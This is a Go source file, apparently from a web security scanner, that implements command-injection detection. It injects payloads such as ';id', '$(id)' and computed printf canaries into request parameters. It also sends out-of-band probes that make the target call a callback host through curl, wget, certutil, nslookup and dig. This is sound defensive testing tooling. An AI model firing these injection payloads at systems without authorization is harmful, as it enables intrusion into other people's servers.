package modules

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/akha-security/akca/engine/internal/payloadgen"
	"github.com/akha-security/akca/engine/internal/timingblind"
)

func (r *Runner) runCommandInjection(ctx context.Context, target ScanTarget) []ModuleFinding {
	if strings.TrimSpace(target.Parameter) == "" {
		return nil
	}
	if !isLikelyCommandInjectionParam(target.Parameter) {
		r.emitSkip("command_injection", target, "parameter is not a command injection candidate")
		return nil
	}
	var out []ModuleFinding
	baseline, err := r.probeForModule(ctx, "command_injection", target, "akca-cmd-base")
	if err != nil {
		baseline, err = r.cachedEmptyProbe(ctx, target)
		if err != nil {
			r.emitSkip("command_injection", target, "baseline and empty-request fallback failed: "+err.Error())
			return nil
		}
	}
	timingBase := r.calibrateTargetTimingForModule(ctx, "command_injection", target)
	sleepSec := timingblind.RecommendSleepSec(timingBase)
	lowerHints := strings.ToLower(r.techDatabaseHint(target.EndpointURL) + " " + target.EndpointURL + " " + target.Profile.ContentType)
	windows := strings.Contains(lowerHints, "windows") || strings.Contains(lowerHints, "iis") || strings.Contains(lowerHints, "asp.net") || strings.Contains(lowerHints, "aspx") || strings.Contains(lowerHints, ".asp")

	probes := payloadsForClass(target.Payloads.Payloads, "command_injection")
	primarySeed, verificationSeed := commandCanarySeeds(r.scanID, target)
	canaryProbes := commandCanaryProbes(windows, primarySeed, "primary")
	probes = append(canaryProbes, probes...)
	if len(probes) == len(canaryProbes) {
		probes = append(probes, []payloadgen.Payload{
			{Value: `|id`, VulnClass: "command_injection", Variant: "pipe", ExpectedSignal: "command_output"},
			{Value: `;id`, VulnClass: "command_injection", Variant: "semicolon", ExpectedSignal: "command_output"},
			{Value: `&&id`, VulnClass: "command_injection", Variant: "and", ExpectedSignal: "command_output"},
			{Value: `\nid`, VulnClass: "command_injection", Variant: "newline", ExpectedSignal: "command_output"},
			{Value: `$(id)`, VulnClass: "command_injection", Variant: "subshell", ExpectedSignal: "command_output"},
			{Value: "`id`", VulnClass: "command_injection", Variant: "backtick", ExpectedSignal: "command_output"},
		}...)
	}
	isNumeric := isNumericTargetValue(target)
	nativeVal := nativeTargetValue(target)
	if isNumeric && nativeVal != "" {
		numericProbes := []payloadgen.Payload{
			{Value: nativeVal + "; id", VulnClass: "command_injection", Variant: "numeric_semicolon", ExpectedSignal: "command_output"},
			{Value: nativeVal + "| id", VulnClass: "command_injection", Variant: "numeric_pipe", ExpectedSignal: "command_output"},
			{Value: nativeVal + "&& id", VulnClass: "command_injection", Variant: "numeric_and", ExpectedSignal: "command_output"},
			{Value: nativeVal + "$(id)", VulnClass: "command_injection", Variant: "numeric_subshell", ExpectedSignal: "command_output"},
			{
				Value:                fmt.Sprintf(`%s; printf 'AKCA_CMD_%%d' $((%d+1))`, nativeVal, primarySeed),
				VulnClass:            "command_injection",
				Family:               "command_injection",
				Variant:              "numeric_computed_canary",
				ExpectedSignal:       "canary_output",
				VerificationStrategy: "computed_output_pair",
				NoiseLevel:           "high",
				RiskLevel:            "active",
				Priority:             80,
				BudgetCost:           2,
			},
		}
		probes = append(numericProbes, probes...)
	}
	fastFailLimit := 6
	if isNumeric {
		fastFailLimit = 10
	}
	earlySignalFound := false
	for idx, p := range probes {
		if idx >= fastFailLimit && !earlySignalFound && len(out) == 0 {
			break
		}
		probePayload := p
		if timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
			probePayload.Value = timingblind.RewriteSleepDuration(p.Value, sleepSec)
		}
		start := time.Now()
		attempts := r.injectionProbeAttemptsForModule(ctx, "command_injection", target, probePayload.Value)
		attempt := pickBodyDiffAttempt(attempts, baseline.Response.Body)
		if len(attempts) == 0 {
			continue
		}
		rr := attempt.RR
		if isInfrastructureError(rr.Response.StatusCode) {
			continue
		}
		probeTarget := attempt.Target
		if probeTarget.EndpointURL == "" {
			probeTarget = target
		}
		if runtimeFinding, handled := r.runtimeSinkProof(
			ctx, "command_injection", probeTarget, probePayload, baseline, rr,
		); handled {
			if runtimeFinding != nil {
				r.recordFinding(ctx, &out, runtimeFinding, "command_injection", runtimeFinding.Evidence.Signal)
				return out
			}
			continue
		}
		elapsed := time.Since(start).Milliseconds()
		if rr.Response.Duration.Milliseconds() > 0 {
			elapsed = rr.Response.Duration.Milliseconds()
		}
		signal := detectCommandSignal(probePayload, rr.Response.Body, baseline.Response.Body, elapsed, timingBase, sleepSec)
		if signal != "" || rr.Response.StatusCode >= 500 ||
			(baseline.Response.StatusCode < 400 && rr.Response.StatusCode >= 400 && rr.Response.StatusCode != 404) {
			earlySignalFound = true
		}
		if signal == "" && r.cfg.EnableOAST && r.oast != nil {
			if oast := strings.TrimSpace(r.oastURL(ctx, "cmd-"+target.Parameter, target, "command_injection")); oast != "" {
				for _, callbackPayload := range commandOASTProbes(oast, windows) {
					r.sendOASTProbe(ctx, target, callbackPayload)
				}
			}
			continue
		}
		if signal == "" {
			continue
		}
		if !cmdInjSignalConfirmed(probePayload, rr.Response.Body, baseline.Response.Body, signal) {
			continue
		}
		// Every output-based signal must pass a second, independently computed
		// canary. The expected marker is not present verbatim in the request, so
		// URL/HTML reflection cannot satisfy this proof.
		if signal == "separator_output" || signal == "command_output" || signal == "canary_output" {
			proofPayload := commandCanaryProbe(probePayload, windows, verificationSeed, "verification")
			reprobe, repErr := r.probeForModule(ctx, "command_injection", probeTarget, proofPayload.Value)
			if repErr != nil || !cmdInjSignalConfirmed(proofPayload, reprobe.Response.Body, baseline.Response.Body, "canary_output") {
				continue
			}
			probePayload = proofPayload
			rr = reprobe
			signal = "canary_output"
		}
		if signal == "timing_signal" {
			r.scheduleDelayedTimingProbe(delayedTimingProbe{
				Target: target, Module: "command_injection", Payload: probePayload,
				Baseline: timingBase, SleepSec: sleepSec, FirstMs: elapsed, Scheduled: time.Now(),
			})
			continue
		}
		f := r.verifyAndBuild(ctx, "command_injection", probeTarget, probePayload, baseline, rr, signal, false, false, "", "")
		if f != nil {
			if signal == "canary_output" {
				f.Evidence.ResponseMarkers = []string{commandExpectedMarker(probePayload)}
				f.Description += " Proof: the response contained a computed marker that was not present verbatim in the request."
			}
			if r.recordFinding(ctx, &out, f, "command_injection", signal) {
				return out
			}
		}
	}

	dyn := timingblind.CommandSleepPayload(sleepSec, windows)
	start := time.Now()
	attempts := r.injectionProbeAttemptsForModule(ctx, "command_injection", target, dyn.Value)
	attempt := pickSlowestAttempt(attempts)
	if len(attempts) == 0 {
		return out
	}
	rr := attempt.RR
	if isInfrastructureError(rr.Response.StatusCode) {
		return out
	}
	elapsed := time.Since(start).Milliseconds()
	if rr.Response.Duration.Milliseconds() > 0 {
		elapsed = rr.Response.Duration.Milliseconds()
	}
	if ok, _ := timingblind.VerifyProbe(elapsed, timingBase, sleepSec); ok {
		r.scheduleDelayedTimingProbe(delayedTimingProbe{
			Target: target, Module: "command_injection", Payload: dyn,
			Baseline: timingBase, SleepSec: sleepSec, FirstMs: elapsed, Scheduled: time.Now(),
		})
	}
	return out
}

func commandCanarySeeds(scanID string, target ScanTarget) (int, int) {
	sum := sha256.Sum256([]byte(scanID + "|" + target.EndpointURL + "|" + target.Parameter + "|" + target.Location + "|command-canary"))
	primary := 10000 + int(binary.BigEndian.Uint32(sum[:4])%80000)
	verification := 10000 + int(binary.BigEndian.Uint32(sum[4:8])%80000)
	if verification == primary {
		verification = 10000 + (verification-9999)%80000
	}
	return primary, verification
}

func commandOASTPayload(callbackURL string, windows bool) string {
	u, err := url.Parse(strings.TrimSpace(callbackURL))
	if err != nil || u.Hostname() == "" {
		return ""
	}
	host := u.Hostname()
	if windows {
		return "&nslookup " + host
	}
	return ";nslookup " + host
}

func commandOASTProbes(callbackURL string, windows bool) []string {
	u, err := url.Parse(strings.TrimSpace(callbackURL))
	if err != nil || u.Hostname() == "" {
		return nil
	}
	host := u.Hostname()
	if windows {
		return []string{
			"&nslookup " + host,
			"&powershell -c \"Resolve-DnsName " + host + "\"",
			"&certutil -urlcache -split -f http://" + host + "/akca",
		}
	}
	return []string{
		";nslookup " + host,
		";curl http://" + host + "/akca",
		";wget -q -O- http://" + host + "/akca",
		";dig " + host,
		";python3 -c \"import socket;socket.getaddrinfo('" + host + "',80)\"",
	}
}

func detectCommandSignal(p payloadgen.Payload, body, baseline string, elapsedMs int64, timingBase timingblind.Baseline, sleepSec int) string {
	if expected := commandExpectedMarker(p); expected != "" && !strings.Contains(p.Value, expected) &&
		strings.Contains(body, expected) && !strings.Contains(baseline, expected) {
		return "canary_output"
	}
	if commandOutputForPayload(p, body) && !commandOutputForPayload(p, baseline) {
		return "separator_output"
	}
	if timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
		if ok, _ := timingblind.VerifyProbe(elapsedMs, timingBase, sleepSec); ok {
			return "timing_signal"
		}
	}
	return ""
}

func commandCanaryProbes(windows bool, seed int, stage string) []payloadgen.Payload {
	if windows {
		return []payloadgen.Payload{
			{
				Value:     fmt.Sprintf(`&cmd /V:ON /C "set /A x=%d+1&echo AKCA_CMD_!x!"`, seed),
				VulnClass: "command_injection", Family: "command_injection",
				Variant: "windows_computed_canary_" + stage, ExpectedSignal: "canary_output",
				VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
			},
		}
	}
	separators := []struct{ prefix, suffix, name string }{
		{";", "", "semicolon"},
		{"|", "", "pipe"},
		{"&&", "", "and"},
		{"||", "", "or"},
		{"\n", "", "newline"},
		{"`", "`", "backtick"},
		{"$(", ")", "subshell"},
	}
	var out []payloadgen.Payload
	for _, sep := range separators {
		out = append(out, payloadgen.Payload{
			Value:     fmt.Sprintf(`%sprintf 'AKCA_CMD_%%d' $((%d+1))%s`, sep.prefix, seed, sep.suffix),
			VulnClass: "command_injection", Family: "command_injection",
			Variant: "unix_computed_canary_" + sep.name + "_" + stage, ExpectedSignal: "canary_output",
			VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
		})
	}
	return out
}

func commandCanaryProbe(original payloadgen.Payload, windows bool, seed int, stage string) payloadgen.Payload {
	if windows {
		return payloadgen.Payload{
			Value:     fmt.Sprintf(`&cmd /V:ON /C "set /A x=%d+1&echo AKCA_CMD_!x!"`, seed),
			VulnClass: "command_injection", Family: "command_injection",
			Variant: "windows_computed_canary_" + stage, ExpectedSignal: "canary_output",
			VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
		}
	}
	prefix, suffix := ";", ""
	val := strings.TrimSpace(original.Value)
	switch {
	case strings.HasPrefix(val, "|"):
		prefix = "|"
	case strings.HasPrefix(val, "&&"):
		prefix = "&&"
	case strings.HasPrefix(val, "||"):
		prefix = "||"
	case strings.HasPrefix(val, "\n"):
		prefix = "\n"
	case strings.HasPrefix(val, "`"):
		prefix, suffix = "`", "`"
	case strings.HasPrefix(val, "$("):
		prefix, suffix = "$(", ")"
	}
	payload := fmt.Sprintf(`%sprintf 'AKCA_CMD_%%d' $((%d+1))%s`, prefix, seed, suffix)
	return payloadgen.Payload{
		Value: payload, VulnClass: "command_injection", Family: "command_injection",
		Variant: "unix_computed_canary_" + stage, ExpectedSignal: "canary_output",
		VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
	}
}

var commandCanaryMathRe = regexp.MustCompile(`\(\((\d+)\+1\)\)|(?i:set\s+/a\s+x=(\d+)\+1)`)

func commandExpectedMarker(p payloadgen.Payload) string {
	match := commandCanaryMathRe.FindStringSubmatch(p.Value)
	if len(match) == 0 {
		return ""
	}
	number := match[1]
	if number == "" && len(match) > 2 {
		number = match[2]
	}
	seed, err := strconv.Atoi(number)
	if err != nil {
		return ""
	}
	return fmt.Sprintf("AKCA_CMD_%d", seed+1)
}

func isLikelyCommandInjectionParam(param string) bool {
	p := strings.ToLower(strings.TrimSpace(param))
	if p == "" {
		return false
	}
	switch p {
	case "_", "t", "ts", "timestamp", "cb", "cache", "nocache", "v", "ver", "version",
		"format", "lang", "locale", "theme", "sort", "order", "dir", "asc", "desc",
		"limit", "offset", "page_size", "per_page", "count", "qty", "quantity",
		"price", "amount", "total", "id", "user_id", "product_id", "item_id", "category_id",
		"account_id", "org_id", "role_id", "status", "state", "is_active", "enabled",
		"disabled", "color", "size", "width", "height", "lat", "lon", "lng", "zoom",
		"utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "ref", "fbclid", "gclid":
		return false
	}
	return true
}
